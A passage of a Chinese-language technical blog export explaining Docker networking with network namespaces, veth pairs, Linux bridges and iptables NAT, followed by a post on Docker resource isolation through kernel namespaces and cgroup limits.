preferred_lft forever</span><br></pre></td></tr></table></figure>
<ul>
<li>ns19、ns29这两个namespace的网络不能ping通各自的<code>192.168.200.0</code>网段的ip地址<br>  将ns19、ns29中的<code>lo</code>设备激活(up)，便能ping通各自的ip地址了。</li>
<li>ns19 namespace的网络能ping同<code>192.168.200.16</code>和<code>192.168.200.26</code>，但不能ping通<code>192.168.200.29</code><br>  ns29 namespace的网络却不能ping通任何一个ip地址。</li>
<li>将ns29所对应的veth pair划分独立网段(<code>192.168.29.0</code>)，veth pair对应的两个网卡便能正常ping通</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns19 ping 192.168.200.16</span></span><br><span class="line">ING 192.168.200.16 (192.168.200.16) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.200.16: icmp_seq=1 ttl=64 time=0.060 ms</span><br><span class="line">64 bytes from 192.168.200.16: icmp_seq=2 ttl=64 time=0.065 ms</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns19 ping 192.168.200.26</span></span><br><span class="line">PING 192.168.200.26 (192.168.200.26) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.200.26: icmp_seq=1 ttl=64 time=0.041 ms</span><br><span class="line">64 bytes from 192.168.200.26: icmp_seq=2 ttl=64 time=0.063 ms</span><br><span class="line">64 bytes from 192.168.200.26: icmp_seq=3 ttl=64 time=0.057 ms</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns29 ping 192.168.200.26 -w 5</span></span><br><span class="line">PING 192.168.200.26 (192.168.200.26) 56(84) bytes of data.</span><br><span class="line"></span><br><span class="line">--- 192.168.200.26 ping statistics --- </span><br><span class="line">6 packets transmitted, 0 received, 100% packet loss, time 4999ms</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns29 ping 192.168.200.16 -w 5</span></span><br><span class="line">PING 192.168.200.16 (192.168.200.16) 56(84) bytes of data.</span><br><span class="line"></span><br><span class="line">--- 192.168.200.16 ping statistics ---</span><br><span class="line">6 packets transmitted, 0 received, 100% packet loss, time 4999ms</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns29 ip addr delete 192.168.200.29/24 dev vp29</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns29 ip addr add 192.168.29.29/24 dev vp29</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip addr delete 192.168.200.26/24 dev vp26</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip addr add 192.168.29.26/24 dev vp26</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns29 ping 192.168.29.26</span></span><br><span class="line">PING 192.168.29.26 (192.168.29.26) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.29.26: icmp_seq=1 ttl=64 time=0.059 ms</span><br><span class="line">64 bytes from 192.168.29.26: icmp_seq=2 ttl=64 time=0.051 ms</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="brctl"><a href="#brctl" class="headerlink" title="brctl"></a>brctl</h2><p>brctl是<code>bridge-utils</code>包中的程序，用于管理linux bridge的CLI工具。</p>
<p>创建bridge设备</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> brctl addbr vb</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> brctl show</span></span><br><span class="line">bridge name     bridge id               STP enabled     interfaces</span><br><span class="line">vb              8000.000000000000       no</span><br></pre></td></tr></table></figure>
<p>将网卡vp16和vp26添加到bridge设备中，可实现vp19与vp29的通讯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> brctl addif vb vp16</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> brctl addif vb vp26</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> brctl show</span></span><br><span class="line">bridge name     bridge id               STP enabled     interfaces</span><br><span class="line">vb              8000.1eeacf8651ab       no              vp16</span><br><span class="line">                                                        vp26</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns29 ping 192.168.200.19</span></span><br><span class="line">PING 192.168.200.19 (192.168.200.19) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.200.19: icmp_seq=1 ttl=64 time=0.063 ms</span><br><span class="line">64 bytes from 192.168.200.19: icmp_seq=2 ttl=64 time=0.072 ms</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns19 ping 192.168.200.29</span></span><br><span class="line">PING 192.168.200.29 (192.168.200.29) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.200.29: icmp_seq=1 ttl=64 time=0.066 ms</span><br><span class="line">64 bytes from 192.168.200.29: icmp_seq=2 ttl=64 time=0.058 ms</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>若希望namespace网络能ping通宿主机内所有网络，需要添加默认网关</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns19 ping 192.168.3.5</span></span><br><span class="line">connect: Network is unreachable</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns29 ping 192.168.3.5</span></span><br><span class="line">connect: Network is unreachable</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns19 route add default gw 192.168.200.1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns19 route -n</span></span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">0.0.0.0         192.168.200.1   0.0.0.0         UG    0      0        0 vp19</span><br><span class="line">192.168.200.0   0.0.0.0         255.255.255.0   U     0      0        0 vp19</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns19 ping 192.168.3.5</span></span><br><span class="line">PING 192.168.3.5 (192.168.3.5) 56(84) bytes of data.</span><br><span class="line"></span><br><span class="line">--- 192.168.3.5 ping statistics ---</span><br><span class="line">4 packets transmitted, 0 received, 100% packet loss, time 2999ms</span><br></pre></td></tr></table></figure>
<p>配置完默认网关后，<code>网络不可达</code>变成了<code>访问超时</code>，此时需要将网卡<code>vp16</code>和<code>vp26</code>的IP地址删除</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip addr delete 192.168.200.16/24 dev vp16</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip addr delete 192.168.200.26/24 dev vp26</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip addr show</span></span><br><span class="line">...</span><br><span class="line">4: vp16@if3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master vb state UP group default qlen 1000</span><br><span class="line">    link/ether 1e:ea:cf:86:51:ab brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet6 fe80::1cea:cfff:fe86:51ab/64 scope link</span><br><span class="line">        valid_lft forever preferred_lft forever</span><br><span class="line">6: vp26@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master vb state UP group default qlen 1000</span><br><span class="line">    link/ether be:98:08:90:da:7a brd ff:ff:ff:ff:ff:ff link-netnsid 1</span><br><span class="line">    inet6 fe80::bc98:8ff:fe90:da7a/64 scope link</span><br><span class="line">        valid_lft forever preferred_lft forever</span><br><span class="line">7: vb: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    link/ether 1e:ea:cf:86:51:ab brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.200.1/24 scope global vb</span><br><span class="line">        valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::1cea:cfff:fe86:51ab/64 scope link</span><br><span class="line">        valid_lft forever preferred_lft forever</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns19 ping 192.168.3.5</span></span><br><span class="line">PING 192.168.3.5 (192.168.3.5) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.3.5: icmp_seq=1 ttl=64 time=0.064 ms</span><br><span class="line">64 bytes from 192.168.3.5: icmp_seq=2 ttl=64 time=0.062 ms</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="iptables-netfilter"><a href="#iptables-netfilter" class="headerlink" title="iptables&#x2F;netfilter"></a>iptables&#x2F;netfilter</h2><p>netfilter是Linux操作系统核心层内部的一个数据包处理模块，它具有网络地址转换(Network Address Translate)、数据包过滤、数据包处理、地址伪装、透明代理，以及基于用户及媒体访问控制(Media Access Control，MAC)地址的过滤和基于状态的过滤、包速率限制等。** netfilter工作在三层 **</p>
<p>iptables是与netfilter交互的CLI工具。</p>
<p>按照上述的配置方式，只能做到访问宿主机内的所有网络，若希望ping通宿主机所在网络的其它主机，需要开启ip_forward(<code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</code>，需要以root身份操作，仅仅使用root权限不够)，并关闭防火墙(iptables)或配置防火墙<code>POSTROUTING</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> iptables -t nat -A POSTROUTING -s 192.168.200.0/24 -p all -j MASQUERADE</span></span><br><span class="line">hain PREROUTING (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line"></span><br><span class="line">Chain INPUT (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line"></span><br><span class="line">Chain POSTROUTING (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">MASQUERADE  all  --  192.168.200.0/24     0.0.0.0/0</span><br></pre></td></tr></table></figure>

<h2 id="TUN-TAP驱动"><a href="#TUN-TAP驱动" class="headerlink" title="TUN&#x2F;TAP驱动"></a>TUN&#x2F;TAP驱动</h2><p>Todo.</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.tuicool.com/wx/nyQFfaZ">探索 Docker bridge 的正确姿势，亲测有效！</a></li>
<li><a href="http://blog.chinaunix.net/uid-27017686-id-5057025.html">虚拟网络设备–VETH pair</a></li>
<li><a href="http://blog.csdn.net/tycoon1988/article/details/39055149">network namespace与veth pair</a></li>
<li><a href="https://segmentfault.com/a/1190000002540601">iptables防火墙原理详解</a></li>
<li><a href="http://www.cnblogs.com/jackhub/p/3575879.html">Linux IP_FORWARD说明</a></li>
<li><a href="https://zhoubofsy.github.io/2017/05/12/network/iptables-introduce/">iptables</a></li>
</ul>
]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker 资源隔离</title>
    <url>/2017/01/25/container/docker/docker-resource-separation/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>docker不是一项新技术，docker是老旧技术的组合，为了更方便使用容器技术，docker提供了简单方便的UI。docker隔离资源主要用到了两种技术namespace、cgroup。</p>
<h1 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h1><p>namespace是linux内核提供的隔离技术，它包括六种资源隔离，UTS（主机名与域名）、IPC（信号量、消息队列和共享内存）、PID（进程编号）、NET（网络设备、网络栈、端口…）、Mount（文件系统、挂载点）、User（用户和用户组）。</p>
<table>
<thead>
<tr>
<th align="center">Type</th>
<th align="center">Sys Params</th>
<th align="center">ker ver</th>
</tr>
</thead>
<tbody><tr>
<td align="center">UTS</td>
<td align="center">CLONE_NEWUTS</td>
<td align="center">2.6.19</td>
</tr>
<tr>
<td align="center">IPC</td>
<td align="center">CLONE_NEWIPC</td>
<td align="center">2.6.19</td>
</tr>
<tr>
<td align="center">PID</td>
<td align="center">CLONE_NEWPID</td>
<td align="center">2.6.24</td>
</tr>
<tr>
<td align="center">NET</td>
<td align="center">CLONE_NEWNET</td>
<td align="center">2.6.29</td>
</tr>
<tr>
<td align="center">Mount</td>
<td align="center">CLONE_NEWNS</td>
<td align="center">2.4.19</td>
</tr>
<tr>
<td align="center">User</td>
<td align="center">CLONE_NEWUSER</td>
<td align="center">3.8</td>
</tr>
</tbody></table>
<p>操作系统调用接口：</p>
<ul>
<li>clone()<br>  创建一个独立的进程独立的namespace</li>
<li>setns()<br>  使用已有的一个namespace</li>
<li>unshare()<br>  不启动新进程，在原进程上进行namespace隔离</li>
</ul>
<p>docker run中提供了使用namespace的接口:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker run --<span class="built_in">help</span> | grep -i namespace</span></span><br><span class="line">--ipc string                  IPC namespace to use</span><br><span class="line">--pid string                  PID namespace to use</span><br><span class="line">--userns string               User namespace to use</span><br><span class="line">--uts string                  UTS namespace to use</span><br></pre></td></tr></table></figure>

<h2 id="UTS"><a href="#UTS" class="headerlink" title="UTS"></a>UTS</h2><p>提供了主机名和域名的隔离，这样每个容器就可以拥有了独立的主机名和域名，在网络上可以被视作一个独立的节点而非宿主机上的一个进程。<br>docker在run或create时，使用<code>-h</code>或<code>--hostname</code>指定hostname</p>
<h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><p>IPC是Unix／linux下进程间通讯的一种方式，包括信号量、消息队列、共享内存。容器内部进程间通信对宿主机来说，实际上是具有相同PID namespace中的进程间通信，因此需要一个唯一的标识符来进行区别。申请IPC资源就申请了这样一个全局唯一的32位ID，所以IPC namespace中实际上包含了系统IPC标识符以及实现POSIX消息队列的文件系统。在同一个IPC namespace下的进程彼此可见，而与其他的IPC namespace下的进程则互相不可见。</p>
<p>在宿主机上创建IPC（以消息队列为例）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ipcmk -Q</span></span><br><span class="line">消息队列 id：32768</span><br></pre></td></tr></table></figure>
<p>在宿主机上查询IPC：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ipcs</span></span><br><span class="line"></span><br><span class="line">--------- 消息队列 -----------</span><br><span class="line">键        msqid      拥有者  权限     已用字节数 消息</span><br><span class="line">0xabba8164 32768      root       644        0            0</span><br></pre></td></tr></table></figure>
<p>在容器中查询IPC：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker <span class="built_in">exec</span> -it net_5 ipcs</span></span><br><span class="line"></span><br><span class="line">------ Message Queues --------</span><br><span class="line">key        msqid      owner      perms      used-bytes   messages</span><br><span class="line"></span><br><span class="line">------ Shared Memory Segments --------</span><br><span class="line">key        shmid      owner      perms      bytes      nattch     status</span><br><span class="line"></span><br><span class="line">------ Semaphore Arrays --------</span><br><span class="line">key        semid      owner      perms      nsems</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="PID"><a href="#PID" class="headerlink" title="PID"></a>PID</h2><p>它对进程PID重新标号，即两个不同namespace下的进程可以有同一个PID。每个PID namespace都有自己的计数程序。内核为所有的PID namespace维护了一个树状结构，最顶层的是系统初始时创建的，我们称之为root namespace。他创建的新PID namespace就称之为child namespace（树的子节点），而原先的PID namespace就是新创建的PID namespace的parent namespace（树的父节点）。通过这种方式，不同的PID namespaces会形成一个等级体系。所属的父节点可以看到子节点中的进程，并可以通过信号等方式对子节点中的进程产生影响。反过来，子节点不能看到父节点PID namespace中的任何内容。<br>    * 每个PID namespace中的第一个进程“PID 1“，都会像传统Linux中的init进程一样拥有特权，起特殊作用。<br>    * 一个namespace中的进程，不可能通过kill或ptrace影响父节点或者兄弟节点中的进程，因为其他节点的PID在这个namespace中没有任何意义。<br>    * 如果你在新的PID namespace中重新挂载&#x2F;proc文件系统，会发现其下只显示同属一个PID namespace中的其他进程。（挂载&#x2F;proc 文件系统尤为重要）<br>    * 在root namespace中可以看到所有的进程，并且递归包含所有子节点中的进程。</p>
<p><img src="/images/docker/docker-resource-separation-pid.png" alt="docker-resource-separation-pid"></p>
<p>以容器的ceph-mon节点为例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">宿主机上查看 ceph-mon 进程</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ps -ef| grep 9184</span></span><br><span class="line">root      9184  3122  0 1月20 ?       00:00:04 docker-containerd-shim be0583fade06df3f6510dd629bde4a636e68c755aa8b0733db6702493b1d0c38 /var/run/docker/libcontainerd/be0583fade06df3f6510dd629bde4a636e68c755aa8b0733db6702493b1d0c38 docker-runc</span><br><span class="line">64045     9200  9184  0 1月20 ?       00:01:03 /usr/bin/ceph-mon --cluster ceph -d -i rhel82 --public-addr 192.168.1.82:6789 --setuser ceph --setgroup ceph</span><br><span class="line">root     21893  9855  0 16:15 pts/5    00:00:00 grep --color=auto 9184</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">容器中查看 ceph-mon 进程</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker <span class="built_in">exec</span> -it ceph-mon ps -ef</span></span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">ceph         1     0  0 Jan20 ?        00:01:03 /usr/bin/ceph-mon --cluster ceph</span><br><span class="line">root        26     0  0 08:15 ?        00:00:00 ps -ef</span><br></pre></td></tr></table></figure>

<h2 id="NET"><a href="#NET" class="headerlink" title="NET"></a>NET</h2><p>Pv4和IPv6协议栈、IP路由表、防火墙、&#x2F;proc&#x2F;net目录、&#x2F;sys&#x2F;class&#x2F;net目录、端口（socket）等等。一个物理的网络设备最多存在在一个network namespace中，你可以通过创建veth pair（虚拟网络设备对：有两端，类似管道，如果数据从一端传入另一端也能接收到，反之亦然）在不同的network namespace间创建通道，以此达到通信的目的。</p>
<p>一般情况下，物理网络设备都分配在最初的root namespace（表示系统默认的namespace，在PID namespace中已经提及）中。但是如果你有多块物理网卡，也可以把其中一块或多块分配给新创建的network namespace。需要注意的是，当新创建的network namespace被释放时（所有内部的进程都终止并且namespace文件没有被挂载或打开），在这个namespace中的物理网卡会返回到root namespace而非创建该进程的父进程所在的network namespace。</p>
<p>当我们说到network namespace时，其实我们指的未必是真正的网络隔离，而是把网络独立出来，给外部用户一种透明的感觉，仿佛跟另外一个网络实体在进行通信。为了达到这个目的，容器的经典做法就是创建一个veth pair，一端放置在新的namespace中，通常命名为eth0，一端放在原先的namespace中连接物理网络设备，再通过网桥把别的设备连接进来或者进行路由转发，以此网络实现通信的目的。</p>
<p><img src="/images/docker/docker-resource-separation-network.png" alt="docker-resource-separation-network"></p>
<p>可通过<code>ip netns</code>、<code>brctl</code>管理Network Namespace，docker创建的netns路径为<code>/proc/&#123;进程ID&#125;/ns/net</code>，<code>ip netns</code>访问的默认路径为<code>/var/run/netns/</code>。<br>若需要访问其Network Namespace内部，先创建软连接链至<code>ip netns</code>访问路径，然后使用<code>ip netns exec</code>访问该网络内部。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在ip netns访问路径下创建network namespace的软链接</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ln</span> -s /proc/7013/ns/net /var/run/netns/net_5</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 ip netns <span class="built_in">exec</span> 访问指定network namespace的网络</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ip netns <span class="built_in">exec</span> net_5 ip addr</span></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default</span><br><span class="line">  link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">  inet 127.0.0.1/8 scope host lo</span><br><span class="line">  valid_lft forever preferred_lft forever</span><br><span class="line">  inet6 ::1/128 scope host</span><br><span class="line">  valid_lft forever preferred_lft forever</span><br><span class="line">15: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">  link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">  inet 172.17.0.3/16 scope global eth0</span><br><span class="line">  valid_lft forever preferred_lft forever</span><br><span class="line">  inet6 fe80::42:acff:fe11:3/64 scope link</span><br><span class="line">  valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<h2 id="Mount"><a href="#Mount" class="headerlink" title="Mount"></a>Mount</h2><p>隔离后，不同mount namespace中的文件结构发生变化也互不影响。你可以通过<code>/proc/[pid]/mounts</code>查看到所有挂载在当前namespace中的文件系统，还可以通过<code>/proc/[pid]/mountstats</code>看到mount namespace中文件设备的统计信息，包括挂载文件的名字、文件系统类型、挂载位置等等。（此处用到了<a href="https://zhoubofsy.github.io/2017/01/24/linux/mount-usage/">mount propagation </a> 技术）</p>
<p><img src="/images/docker/docker-resource-separation-mount.png" alt="docker-resource-separation-mount.png"><br>上图mount挂载方式有待确认。</p>
<h2 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h2><p>主要隔离了安全相关的标识符（identifiers）和属性（attributes），包括用户ID、用户组ID、root目录、key（指密钥）以及特殊权限。说得通俗一点，一个普通用户的进程通过clone()创建的新进程在新user namespace中可以拥有不同的用户和用户组。这意味着一个进程在容器外属于一个没有特权的普通用户，但是他创建的容器进程却属于拥有所有权限的超级用户，这个技术为容器提供了极大的自由。</p>
<p>docker通过<code>/proc/&#123;进程ID&#125;/uid_map</code>和<code>/proc/&#123;进程ID&#125;/gid_map</code>把容器中的uid、gid和真实系统的uid、gid给映射在一起，格式为：<code>ID-inside-ns   ID-outside-ns   length</code>。</p>
<ul>
<li>ID-inside-ns 表示在容器内显示的uid或gid</li>
<li>ID-outside-ns 表示在容器外映射的真实的uid或gid</li>
<li>length 表示映射范围，一般为1，表示一一对应(把ID-outside-ns ~（ID-outside-ns+length） 映射到 ID-inside-ns ～（ID-inside-ns+length）上)</li>
</ul>
<h1 id="cgroups"><a href="#cgroups" class="headerlink" title="cgroups"></a>cgroups</h1><p>Control Groups(cgroups)，是Linux 内核提供的一种可以限制、记录、隔离进程组所使用的物理资源(如 cpu、memory、磁盘IO等等) 的机制，被LXC、docker等很多项目用于实现进程资源控制。</p>
<p>cgroups子系统：</p>
<ul>
<li>cpu<br>  使用调度程序提供对 CPU 的 cgroup 任务访问</li>
<li>cpuset<br>  为cgroup中的任务分配独立CPU（在多核系统）和内存节点</li>
<li>devices<br>  可允许或者拒绝 cgroup 中的任务访问设备</li>
<li>blkio<br>  为块设备设定输入&#x2F;输出限制，比如物理设备（磁盘，固态硬盘，USB 等等）</li>
<li>freezer<br>  挂起或者恢复 cgroup 中的任务</li>
<li>memory<br>  设定 cgroup 中任务使用的内存限制，并自动生成由那些任务使用的内存资源报告</li>
<li>net_cls<br>  使用等级识别符（classid）标记网络数据包，可允许 Linux 流量控制程序（tc）识别从具体 cgroup 中生成的数据包</li>
</ul>
<h2 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h2><h3 id="cpu-shares"><a href="#cpu-shares" class="headerlink" title="cpu-shares"></a>cpu-shares</h3><p>在<code>docker create/run</code>容器时可以通过<code>--cpu-shares</code>参数来指定容器所使用的CPU加权值。默认情况下，每个docker容器的cpu-shares值都是1024。单独一个容器的cpu-shares是没有意义的，只在多个容器分配的资源紧缺时，也就是说在需要对容器使用的资源进行限制时，才会生效。配之后，可通过<code>./cgroup/cpu/docker/&lt;容器ID&gt;/cpu.shares</code>查看。</p>
<h3 id="cpu-period-cpu-quota"><a href="#cpu-period-cpu-quota" class="headerlink" title="cpu-period &amp; cpu-quota"></a>cpu-period &amp; cpu-quota</h3><ul>
<li>cpu-period 用来指定容器对CPU的使用要在多长时间内做一次重新分配</li>
<li>cpu-quota 用来指定在这个周期内，最多可以有多少时间用来跑这个容器<br>在<code>docker create/run</code>时使用，参数为<code>--cpu-period</code>和<code>--cpu-quota</code>单位为微秒，cpu-period的默认值为0.1秒（100000 微秒），cpu-quota的默认值为-1(表示不控制)。配置后，可通过<code>./cgroup/cpu/docker/&lt;容器ID&gt;/cpu.cfs_period_us</code>和<code>./cgroup/cpu/docker/&lt;容器ID&gt;/cpu.cfs_quota_us</code>查看。</li>
</ul>
<h3 id="cpuset"><a href="#cpuset" class="headerlink" title="cpuset"></a>cpuset</h3><p>docker可使用<code>--cpuset-cpus</code>和<code>--cpuset-mems</code>参数控制容器运行限定使用哪些cpu和内存节点。配之后，可通过<code>./cgroup/cpuset/docker/&lt;容器ID&gt;/cpuset.cpus</code>和<code>./cgroup/cpuset/docker/&lt;容器ID&gt;/cpuset.mems</code>查看。</p>
<p>*** 注：对于具有NUMA的服务器很重要 ***</p>
<h2 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h2><p>在<code>docker create/run</code>时，可以对内存资源加以限制。</p>
<ul>
<li>kernel-memory<br>  使用参数<code>--kernel-memory</code>，限制内核内存，该内存不会被交换到swap上。</li>
<li>memory<br>  使用参数<code>--memory</code>，设置容器使用的最大内存上限。默认单位为byte，可以使用K、G、M等带单位的字符串。</li>
<li>memory-reservation<br>  使用参数<code>--memory-reservation</code>，启用弹性的内存共享，当宿主机资源充足时，允许容器尽量多地使用内存，当检测到内存竞争或者低内存时，强制将容器的内存降低到memory-reservation所指定的内存大小。不设置此选项时，有可能出现某些容器长时间占用大量内存，导致性能上的损失。</li>
<li>memory-swap<br>  使用参数<code>--memory-swap</code>，设置总内存大小，相当于内存和swap大小的总和，设置-1时，表示swap分区大小是无限的。默认单位为byte，可以使用K、G、M等带单位的字符串。</li>
<li>memory-swappiness<br>  使用参数<code>--memory-swappiness</code>，设置控制进程将物理内存交换到swap分区的倾向，系数越小，就越倾向于使用物理内存。值范围为0-100。当值为100时，表示尽量使用swap分区；当值为0时，表示禁用容器 swap 功能(这点不同于宿主机，宿主机 swappiness 设置为 0 也不保证 swap 不会被使用)</li>
</ul>
<h2 id="Block-Device"><a href="#Block-Device" class="headerlink" title="Block Device"></a>Block Device</h2><h3 id="I-O"><a href="#I-O" class="headerlink" title="I&#x2F;O"></a>I&#x2F;O</h3><ul>
<li>device-read-bps<br>  限制此设备上的读速度（bytes per second），单位可以是kb、mb或者gb</li>
<li>device-read-iops<br>  通过每秒读IO次数来限制指定设备的读速度</li>
<li>device-write-bps<br>  限制此设备上的写速度（bytes per second），单位可以是kb、mb或者gb</li>
<li>device-write-iops<br>  通过每秒写IO次数来限制指定设备的写速度</li>
<li>blkio-weight<br>  容器默认磁盘IO的加权值，有效值范围为10-100。要使<code>-–blkio-weight</code>生效，需要保证IO的调度算法为CFQ<br>  <code>echo &quot;cfq&quot; &gt; /sys/block/&lt;设备名&gt;/queue/scheduler</code></li>
<li>blkio-weight-device<br>  针对特定设备的IO加权控制。其格式为DEVICE_NAME:WEIGHT</li>
</ul>
<h3 id="Volume"><a href="#Volume" class="headerlink" title="Volume"></a>Volume</h3><p>使用参数<code>--storage-opt</code>，传入<code>dm.basesize=&lt;容量大小&gt;</code>可以设置rootfs大小。如果不设置<code>dm.basesize</code>，默认值为10G，若要使<code>dm.basesize</code>生效，storage driver 必须是 device mapper。<br>设置rootfs大小后，需要重启docker服务，并且<code>--storage-opts</code>参数需要在启动docker服务时使用。<br>以RHEL7.2为例，需要修改<code>/etc/systemd/system/multi-user.target.wants/docker.service</code>中<code>/usr/bin/dockerd</code>的参数。</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.infoq.com/cn/articles/docker-kernel-knowledge-namespace-resource-isolation?utm_source=tuicool">Docker背后的内核知识——Namespace资源隔离</a></li>
<li><a href="http://www.cnblogs.com/sammyliu/p/5878973.html">理解Docker（3）：Docker 使用 Linux namespace 隔离容器的运行环境</a></li>
<li><a href="http://www.cnblogs.com/ilinuxer/p/6188450.html">Linux Namespace 介绍</a></li>
